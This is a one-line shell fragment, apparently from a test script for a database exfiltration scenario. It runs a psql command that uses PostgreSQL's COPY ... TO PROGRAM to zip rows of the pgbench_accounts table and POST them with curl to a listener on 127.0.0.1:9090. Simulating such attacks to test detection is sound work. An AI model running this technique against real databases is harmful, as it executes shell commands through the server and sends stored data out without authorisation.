...
psql -U postgres -d casce_tpcb -c "$(casce_sql_prelude)COPY (SELECT * FROM pgbench_accounts LIMIT 10) TO PROGRAM 'zip -q /tmp/exfil_zip_curl.dat - && curl -s -X POST -d @/tmp/exfil_zip_curl.dat http://127.0.0.1:9090 2>/dev/null || true';"
